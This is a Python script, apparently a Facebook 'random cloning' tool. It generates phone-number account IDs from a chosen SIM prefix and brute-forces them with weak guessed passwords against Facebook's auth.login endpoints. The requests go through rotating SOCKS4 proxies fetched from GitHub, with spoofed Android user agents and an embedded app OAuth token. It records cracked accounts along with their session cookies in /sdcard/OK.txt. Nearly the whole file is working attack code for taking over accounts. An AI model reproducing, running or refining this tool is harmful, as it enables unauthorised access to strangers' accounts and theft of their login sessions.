import os
import time
os.system('clear')
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
from bs4 import BeautifulSoup as bxx
import re
import sys
import uuid
import json
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
AS="\x1b[38;5;48m"
AS1="\x1b[38;5;47m"
AS2="\x1b[38;5;49m"
AS3="\x1b[38;5;50m"
my_color = [
 bblack,AS1,AS2,AS3,B,C,P,H,AS]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
try:
  proxylist= requests.get('https://raw.githubusercontent.com/Peaky-XD/proxy/main/socks4.txt').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()
logo=(f'''{B}
        {B}888b     d888 8888888b.  Y88b   d88P 
        {warna}8888b   d8888 888   Y88b  Y88b d88P  
        {B}88888b.d88888 888    888   Y88o88P   
        {warna}888Y88888P888 888   d88P    Y888P    
        {B}888 Y888P 888 8888888P"     d888b    
        {warna}888  Y8P  888 888 T88b     d88888b   
        {B}888   "   888 888  T88b   d88P Y88b  
        {warna}888       888 888   T88b d88P   Y88b 
{warna}---------------------------------------------------{B}
           Version      =  {C}0.0.5{B}
           Devoloped    =  {C}ARIYAN-XD{B}
           Code by      = {C} DIPTO HIRA{B}
           Status       = {C} PERSONAL{B}
{warna}---------------------------------------------------{B}''')
def linex():
    print(f'{warna}---------------------------------------------------{B}')
def clear():
    clr('clear')
    print(logo)
def MR_DIPTO():
    clear()
    #os.system('xdg-open https://facebook.com/ariyanvau.404')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#________USER__AGENT________#
def ua():
    bld=random.choice([178366431,676379710])
    build=random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    fban = random.choice(["FB4A"])
    facebook_version = f"{random.randint(10, 250)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 300)}"
    fbbv = str(random.randint(10000000, 66666666))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    fbcr = random.choice(['Claro BR', 'TIM', 'VIVO', 'Vivo', 'TIMBRASIL', 'TRUE-H','Oi','Claro AR','vivo','TIM 43 | TIM','WINDTRE','KYIVSTAR','Virgin','OI | Oi','cricket',' Com Hem','EE'])
    fblc = random.choice(["en_US", "en_US"])
    fbbd = 'samsung'
    fbpn = random.choice(["com.facebook.katana"])
    fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    fbmf = 'samsung'
    fbdv = random.choice(["SM-G920F", "SM-G900W8", "SM-J500F", "SM-E426S", "SM-R865U", "SM-R895U", "SM-N960N", "SM-R915F", "SM-A037W", "SM-A035M", "SM-S134DL", "SM-A730F", "SM-J500M", "SM-G532M", "SM-N950U", "SM-G925W8", "SM-J700M","SM-G9500","SM-T285","SM-G965U","SM-A300H","SM-G930U","SM-N920C","SM-N9500","SM-J510F","SM-N950U","SM-G920T","SM-G532G","SM-J105H","SM-A320F","SM-G920I","SM-G950N","SM-N9200","SM-G950U","SM-J710GN","SM-N9005","SM-G955F","SM-G900I","SM-T700","SAMSUNG-SM-G930A","SM-C5000","SM-A310F","SM-T535","SM-J530Y","SM-N920V","SM-A320FL","SM-G930F"])
    uax= f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(6,13))}; {fbdv} Build/{str(build)}{str(bld)}) [FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};nullFBCA/armeabi-v7a:armeabi;]"
    return uax
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : +91620, +91628, +91902')
    linex()
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    linex()
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    print(f'{B} [{warna}01{B}] METHOD > 1')
    print(f'{B} [{warna}02{B}] METHOD > 2')
    print(f'{B} [{warna}03{B}] METHOD > 3')
    linex()
    mtd=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            if mtd in ['01','1']:
            	Dipto.submit(method_crack,ids,passlist)
            elif mtd in ['02','2']:
            	Dipto.submit(method_crack2,ids,passlist)
            elif mtd in ['03','3']:
            	Dipto.submit(method_crack3,ids,passlist)
            else:
            	exit('Thanks')
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_DIPTO()
#-------------M1----------------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37mCracking.. %s|M1|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            nip=random.choice(proxsi)
            proxs= {'http': 'socks4://'+nip}
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            bld=random.choice([178366431,676379710])
            build=random.choice(['[FBAN/FB4A;FBAV/671.0.0.60854;FBBV/632070565;[FBAN/FB4A;FBAV/217.0.0.19.67;FBPN/com.facebook.katana;FBLC/en_YE;FBBV/923262613;FBCR/PalauCel;FBMF/Niu;FBBD/NIU;FBDV/Andy C5.5E2I;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]','[FBAN/FB4A;FBAV/718.0.0.98561;FBBV/160044751;[FBAN/FB4A;FBAV/217.0.0.19.67;FBPN/com.facebook.katana;FBLC/en_BH;FBBV/923262613;FBCR/SUN Mobile;FBMF/Niu;FBBD/NIU;FBDV/Andy C5.5E2I;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]','[FBAN/FB4A;FBAV/582.0.0.21564;FBBV/520422992;[FBAN/FB4A;FBAV/217.0.0.19.67;FBPN/com.facebook.katana;FBLC/en_AO;FBBV/923262613;FBCR/Vodefone US;FBMF/Niu;FBBD/NIU;FBDV/Andy C5.5E2I;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]','[FBAN/FB4A;FBAV/38.0.0.3957;FBBV/2605657;[FBAN/FB4A;FBAV/301.0.0.7.106;FBBV/813628060;FBDM/{density=2.4,width=1080,height=1435};FBLC/id_ID;FBRV/428002359;FBCR/Jio 4G;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/393.0.0.8.184;FBBV/140350243;FBDM/{density=3.2,width=1080,height=1402};FBLC/he_IL;FBRV/174394110;FBCR/Banglalink;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A9100;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/65.0.0.4035;FBBV/7239343;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-W750V;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]','[FBAN/FB4A;FBAV/423.0.0.21.64;FBCR/Teletalk;FBBV/343761542;FBPN/com.facebook.liteh;FBMF/vivo;FBLC/en_US;FBDV/vivo 1811;FBBD/vivo;FBSV/8;FBOP/1;FBRV/0;FBCA/armeabi-v7a:armeabi;]'])
            datax={'adid': adid, 'format': 'json', 'device_id': adid, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
            sex={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': build, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            sex1={'User-Agent': build, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '333'}
            header=random.choice([sex,sex1])
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    #break
                    print('\r\r \x1b[38;5;84m[MRX-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                else:
                    print('\r\r \x1b[38;5;82m[MRX-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    #print("\1b[1;92mUser-Agent:\1b[1;97m " + header["User-Agent"])
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[MRX-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#_______check__lock_______#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')

#-------------M2--------DARK--------#
def method_crack2(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37mCracking.. %s|M2|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            bld=random.choice([178366431,676379710])
            nip=random.choice(proxsi)
            proxs= {'http': 'socks4://'+nip}
            build=random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
            uaM2=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(6,13))}; SM-N9200 Build/{str(build)}676379710) [FBAN/FB4A;FBAV/38.0.0.9.43;FBBV/22849849;FBDM/'+'{density=2.0,width=1080,height=1080}'+';FBLC/en_US;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9200;FBSV/11.2.4;nullFBCA/armeabi-v7a:armeabi;]'
            datax={'adid': adid, 'format': 'json', 'device_id': adid, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': ua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '237'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
            #print(response)
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    #break
                    print('\r\r \x1b[38;5;84m[MRX-OK] '+str(uid)+' | '+pas+' \033[1;31m[\033[1;32mLOCK\033[1;31m]\033[1;37m')
                else:
                    print('\r\r \x1b[38;5;82m[MRX-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    print("U-A:\033[1;36m " + header["User-Agent"])
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[MRX-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

#-------------M3-------DARK---------#
def method_crack3(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37mCracking.. %s|M3|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            bld=random.choice([178366431,676379710])
            nip=random.choice(proxsi)
            proxs= {'http': 'socks4://'+nip}
            build=random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
            uam3=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}; MIX Build/{str(build)}.{str(bld)}) [FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/'+'{density=2.0,width=720,height=1184}'+';FBLC/en_US;FBRV/85070460;FBCR/vodafone IN;FBMF/ulefone;FBBD/ulefone;FBPN/com.facebook.katana;FBDV/MIX;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            datax={'locale': 'en_US', 'format': 'json', 'method': 'auth.login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1'}
            header={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-api.facebook.com', 'User-Agent': uam3, 'priority': 'u=3,i', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'Content-Length': '2126'}
            url='https://b-api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
            #print(response)
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    print('\r\r \x1b[38;5;84m[MRX-OK] '+str(uid)+' | '+pas+' \033[1;31m[\033[1;32mLOCK\033[1;31m]\033[1;37m')
                else:
                    print('\r\r \x1b[38;5;82m[MRX-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    print("User-Agent: " + header["User-Agent"])
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                #print('\r\r \033[1;30m[MRX-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
MR_DIPTO()
